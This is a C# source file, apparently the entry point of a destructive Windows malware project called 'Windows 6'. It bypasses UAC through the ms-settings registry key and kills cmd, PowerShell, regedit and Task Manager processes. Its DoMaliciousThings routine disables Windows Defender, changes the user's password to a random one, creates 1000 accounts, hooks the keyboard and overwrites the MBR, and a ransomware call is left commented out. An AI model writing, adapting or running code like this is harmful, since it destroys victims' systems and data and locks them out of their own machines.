using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

internal static class Program
{
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [STAThread]
    public static void Main()
    {
        if (!CheckProcesses())
        {
            return;
        }

        if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
        {
            BypassUAC.Bypass();
            string WhatToElevate = Application.ExecutablePath;
            Process.Start("CMD.exe", "/c start \"" + WhatToElevate + "\"");
            RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
            uac_clean.DeleteSubKeyTree("shell");
            uac_clean.Close();
            Process.GetCurrentProcess().Kill();
            return;
        }

        // Ransomware.RunRansomware();
        DoMaliciousThings();
        DoMatrixEffect();
        DoWindows6Loading();

        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new MainForm());
    }

    public static void DoMatrixEffect()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllText(rootDir + "\\MatrixEffect.bat", Windows_6.Properties.Resources.MatrixEffect);
        System.IO.File.SetAttributes(rootDir + "\\MatrixEffect.bat", System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        MalwareUtils.RunMatrixEffect(5, false, 0);
        MalwareUtils.RunMatrixEffect(6, true, 175);
        MalwareUtils.RunMatrixEffect(7, true, 50);
        MalwareUtils.RunMatrixEffect(8, true, 10);
    }

    public static void DoWindows6Loading()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllText(rootDir + "\\Windows6Loading.bat", Windows_6.Properties.Resources.Windows6Loading);
        System.IO.File.SetAttributes(rootDir + "\\Windows6Loading.bat", System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        MalwareUtils.DoWindows6Loading(50, 25);
        MalwareUtils.OpenNotepadAndWrite("Windows 6 installer is opening, please wait a while...", 10, 250, 10, 1500);
    }

    public static bool CheckProcesses()
    {
        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                string completeText = process.ProcessName.ToLower().Replace(" ", "");

                try
                {
                    completeText += process.MainModule.FileName.ToLower().Replace(" ", "");
                }
                catch
                {

                }

                if (completeText.Contains("cmd.exe") || completeText.Contains("powershell") || completeText.Contains("regedit") || completeText.Contains("taskmgr"))
                {
                    process.Kill();
                }
            }
            catch
            {

            }
        }

        return true;
    }

    public static void DoMaliciousThings()
    {
        System.IO.File.SetAttributes(Application.ExecutablePath, System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        Utils.AntiBadProcesses();
        Utils.DisableWindowsDefender();
        Utils.DisableWinRun();
        Utils.SetNewWallpaper();
        Utils.ChangeAllIcons();
        Utils.RefreshDesktop();
        Utils.DisableControlAltDel();
        Utils.DisableUserAccountControl();
        Utils.CreateRandomWindowsUsers(1000);
        Utils.ForcefullyChangePassword(Utils.GenerateRandomWindowsPassword());
        Utils.MakeProcessUnkillable();
        Utils.DisableSystemFunction("DisableTaskMgr");
        Utils.DisableSystemFunction("DisableRegistryTools");
        Utils.DisableSystemFunction("NoControlPanel");
        Utils.EnableSystemFunction("DisableCMD");
        Utils.DisableWindowsKey();
        KeyboardHook.HookToKeyboard();
        Utils.SwapMouseButtons();
        Utils.OverwriteMBR();
        Utils.HideStartMenu();
        Utils.HideElementsFromStartMenu();
        Utils.HideHiddenFiles();
        Utils.DisablePowerFunctions();
        Utils.RestartExplorer();
        Utils.HideStartMenu();
        Utils.ClearProductKeyFromRegistry();
    }
}